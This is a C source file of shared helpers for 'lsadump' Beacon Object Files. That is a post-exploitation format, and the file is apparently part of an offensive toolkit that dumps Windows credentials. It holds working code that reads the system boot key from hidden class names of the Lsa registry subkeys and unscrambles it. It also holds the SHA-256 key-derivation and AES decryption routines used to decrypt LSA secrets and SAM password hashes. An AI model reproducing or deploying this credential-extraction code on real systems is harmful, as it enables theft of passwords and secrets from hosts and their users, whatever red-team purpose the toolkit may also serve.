/*
 * common.c - Shared helper functions for lsadump BOFs
 * by shashinma
 * 
 * This file is #included by each lsadump module
 */

#include "include/lsadump.h"

// ============================================================================
// Helper Functions
// ============================================================================

static void FormatHex(const BYTE* data, DWORD len, char* hexStr, DWORD hexStrSize) {
    DWORD i, pos = 0;
    if (len > 200) len = 200;
    for (i = 0; i < len && pos < hexStrSize - 3; i++) {
        hexStr[pos++] = "0123456789abcdef"[(data[i] >> 4) & 0xF];
        hexStr[pos++] = "0123456789abcdef"[data[i] & 0xF];
    }
    hexStr[pos] = '\0';
}

static BOOL HexCharToNibble(wchar_t c, BYTE* nibble) {
    if (c >= L'0' && c <= L'9') { *nibble = (BYTE)(c - L'0'); return TRUE; }
    if (c >= L'a' && c <= L'f') { *nibble = (BYTE)(c - L'a' + 10); return TRUE; }
    if (c >= L'A' && c <= L'F') { *nibble = (BYTE)(c - L'A' + 10); return TRUE; }
    return FALSE;
}

static BOOL HexStringToDword(const wchar_t* hexStr, DWORD hexLen, BYTE* outBytes) {
    DWORD value = 0, i;
    BYTE nibble;
    if (hexLen != 8) return FALSE;
    for (i = 0; i < 8; i++) {
        if (!HexCharToNibble(hexStr[i], &nibble)) return FALSE;
        value = (value << 4) | nibble;
    }
    outBytes[0] = (BYTE)(value & 0xFF);
    outBytes[1] = (BYTE)((value >> 8) & 0xFF);
    outBytes[2] = (BYTE)((value >> 16) & 0xFF);
    outBytes[3] = (BYTE)((value >> 24) & 0xFF);
    return TRUE;
}

// ============================================================================
// Memory Functions
// ============================================================================

static LPVOID AllocMem(SIZE_T size) {
    return KERNEL32$VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
}

static void FreeMem(LPVOID ptr) {
    if (ptr) KERNEL32$VirtualFree(ptr, 0, MEM_RELEASE);
}

// ============================================================================
// Registry Functions
// ============================================================================

static DWORD GetCurrentControlSet(HKEY hSystem) {
    HKEY hSelect;
    DWORD current = 1, size = sizeof(current);
    if (ADVAPI32$RegOpenKeyExW(hSystem, L"Select", 0, KEY_READ, &hSelect) == ERROR_SUCCESS) {
        ADVAPI32$RegQueryValueExW(hSelect, L"Current", NULL, NULL, (LPBYTE)&current, &size);
        ADVAPI32$RegCloseKey(hSelect);
    }
    return current;
}

static BOOL GetSyskey(HKEY hSystem, BYTE sysKey[SYSKEY_LENGTH]) {
    DWORD controlSet;
    wchar_t lsaPath[64];
    HKEY hLsa;
    const wchar_t* subKeys[] = { L"JD", L"Skew1", L"GBG", L"Data" };
    BYTE rawKey[SYSKEY_LENGTH];
    DWORD i;

    controlSet = GetCurrentControlSet(hSystem);
    MSVCRT$swprintf_s(lsaPath, 64, L"ControlSet%03u\\Control\\Lsa", controlSet);

    if (ADVAPI32$RegOpenKeyExW(hSystem, lsaPath, 0, KEY_READ, &hLsa) != ERROR_SUCCESS)
        return FALSE;

    for (i = 0; i < 4; i++) {
        HKEY hSub;
        wchar_t classData[16];
        DWORD classLen = 16;

        if (ADVAPI32$RegOpenKeyExW(hLsa, subKeys[i], 0, KEY_READ, &hSub) != ERROR_SUCCESS) {
            ADVAPI32$RegCloseKey(hLsa);
            return FALSE;
        }

        if (ADVAPI32$RegQueryInfoKeyW(hSub, classData, &classLen, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) {
            ADVAPI32$RegCloseKey(hSub);
            ADVAPI32$RegCloseKey(hLsa);
            return FALSE;
        }

        if (!HexStringToDword(classData, 8, &rawKey[i * 4])) {
            ADVAPI32$RegCloseKey(hSub);
            ADVAPI32$RegCloseKey(hLsa);
            return FALSE;
        }

        ADVAPI32$RegCloseKey(hSub);
    }

    ADVAPI32$RegCloseKey(hLsa);

    for (i = 0; i < SYSKEY_LENGTH; i++)
        sysKey[i] = rawKey[SYSKEY_PERMUT[i]];

    return TRUE;
}

// ============================================================================
// Crypto: SHA-256 based Key Derivation
// ============================================================================

static BOOL DeriveKey(HCRYPTPROV hProv, const BYTE* key, DWORD keyLen, 
                      const BYTE* iv, DWORD ivLen, DWORD iterations,
                      BYTE* outKey, DWORD outKeyLen) {
    HCRYPTHASH hHash = 0;
    DWORD hashLen = 32;
    DWORD i;

    (void)outKeyLen;

    if (!ADVAPI32$CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash))
        return FALSE;

    if (!ADVAPI32$CryptHashData(hHash, key, keyLen, 0)) {
        ADVAPI32$CryptDestroyHash(hHash);
        return FALSE;
    }

    for (i = 0; i < iterations; i++) {
        if (!ADVAPI32$CryptHashData(hHash, iv, ivLen, 0)) {
            ADVAPI32$CryptDestroyHash(hHash);
            return FALSE;
        }
    }

    if (!ADVAPI32$CryptGetHashParam(hHash, HP_HASHVAL, outKey, &hashLen, 0)) {
        ADVAPI32$CryptDestroyHash(hHash);
        return FALSE;
    }

    ADVAPI32$CryptDestroyHash(hHash);
    return TRUE;
}

// ============================================================================
// Crypto: AES-256 ECB Decryption
// ============================================================================

static BOOL DecryptAES256_ECB(HCRYPTPROV hProv, const BYTE* key, 
                               const BYTE* encrypted, DWORD encLen,
                               BYTE* decrypted) {
    AES_KEY_BLOB keyBlob;
    HCRYPTKEY hKey = 0;
    DWORD decLen = encLen;
    DWORD mode = CRYPT_MODE_ECB;

    keyBlob.header.bType = PLAINTEXTKEYBLOB;
    keyBlob.header.bVersion = CUR_BLOB_VERSION;
    keyBlob.header.reserved = 0;
    keyBlob.header.aiKeyAlg = CALG_AES_256;
    keyBlob.keySize = AES_256_KEY_SIZE;
    MSVCRT$memcpy(keyBlob.key, key, AES_256_KEY_SIZE);

    if (!ADVAPI32$CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hKey))
        return FALSE;

    ADVAPI32$CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0);

    MSVCRT$memcpy(decrypted, encrypted, encLen);
    if (!ADVAPI32$CryptDecrypt(hKey, 0, FALSE, 0, decrypted, &decLen)) {
        ADVAPI32$CryptDestroyKey(hKey);
        return FALSE;
    }

    ADVAPI32$CryptDestroyKey(hKey);
    return TRUE;
}

// ============================================================================
// Crypto: AES-128 CBC Decryption
// ============================================================================

static BOOL DecryptAES128_CBC(HCRYPTPROV hProv, const BYTE* key, const BYTE* iv,
                               const BYTE* encrypted, DWORD encLen, BYTE* decrypted) {
    AES128_KEY_BLOB keyBlob;
    HCRYPTKEY hKey = 0;
    DWORD decLen = encLen;
    DWORD mode = CRYPT_MODE_CBC;

    keyBlob.header.bType = PLAINTEXTKEYBLOB;
    keyBlob.header.bVersion = CUR_BLOB_VERSION;
    keyBlob.header.reserved = 0;
    keyBlob.header.aiKeyAlg = CALG_AES_128;
    keyBlob.keySize = AES_128_KEY_SIZE;
    MSVCRT$memcpy(keyBlob.key, key, AES_128_KEY_SIZE);

    if (!ADVAPI32$CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hKey))
        return FALSE;

    ADVAPI32$CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0);
    ADVAPI32$CryptSetKeyParam(hKey, KP_IV, (BYTE*)iv, 0);

    MSVCRT$memcpy(decrypted, encrypted, encLen);
    if (!ADVAPI32$CryptDecrypt(hKey, 0, FALSE, 0, decrypted, &decLen)) {
        ADVAPI32$CryptDestroyKey(hKey);
        return FALSE;
    }

    ADVAPI32$CryptDestroyKey(hKey);
    return TRUE;
}
